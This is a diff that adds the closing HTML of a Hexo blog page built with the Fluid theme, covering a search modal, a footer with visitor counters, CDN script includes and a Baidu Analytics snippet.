+          lang: "zh-CN",
+          highlight: false,
+          recordIP: false,
+          serverURLs: "",
+        });
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the
+    <a href="https://valine.js.org" target="_blank" rel="nofollow noopener noopener">comments powered by Valine.</a>
+  </noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fxhstudy" target="_blank" rel="nofollow noopener"><span>xFxF</span></a>
+
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    <!-- Baidu Analytics -->
+    <script defer>
+      var _hmt = _hmt || [];
+      (function () {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?2c3982f360efc29d0de4a57e127e3cb9";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+      })();
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
